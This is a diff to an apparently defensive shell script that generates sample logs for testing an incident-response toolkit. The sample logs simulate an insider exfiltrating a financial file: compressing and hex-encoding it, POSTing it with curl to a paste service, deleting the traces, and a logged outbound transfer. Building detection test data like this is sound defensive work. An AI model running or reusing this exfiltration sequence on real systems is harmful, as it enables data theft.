@@ -100,7 +100,7 @@ trap 'rm -rf "$TEMP_DIR"' EXIT
 
 # Function to generate sample log data
 generate_sample_logs() {
-    local output_dir="${TEMP_DIR}/sample_logs"
+    local output_dir="tests/sample_logs"
     mkdir -p "$output_dir"
     
     irf_log INFO "Generating comprehensive sample log data in $output_dir"
@@ -184,7 +184,7 @@ timestamp	source_type	source_name	log_level	username	hostname	ip_address	service
 2023-01-03 02:20:45	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8903	Command executed: cp /var/data/financial/q4_2022_results.xls /tmp/
 2023-01-03 02:22:30	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8904	Command executed: gzip -c /tmp/q4_2022_results.xls > /tmp/file.gz
 2023-01-03 02:23:15	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8905	Command executed: xxd -p /tmp/file.gz | tr -d '\\n'
-2023-01-03 02:25:30	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8906	Command executed: curl -s -X POST https://paste-service.com/api -d "data=$(cat /tmp/hex.txt)"
+2023-01-03 02:25:30	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8906	Command executed: curl -s -X POST https://paste-service.com/api -d "data=\$(cat /tmp/hex.txt)"
 2023-01-03 02:30:00	syslog	dataserver	WARN	analyst	dataserver	10.45.32.17	bash	8907	Command executed: rm -f /tmp/q4_2022_results.xls /tmp/file.gz /tmp/hex.txt
 2023-01-03 02:35:22	firewall	dataserver	WARN		dataserver	10.45.32.17	firewalld	8910	Large outbound transfer: src=10.45.32.17 dst=185.176.43.89 bytes=12458765
 EOF
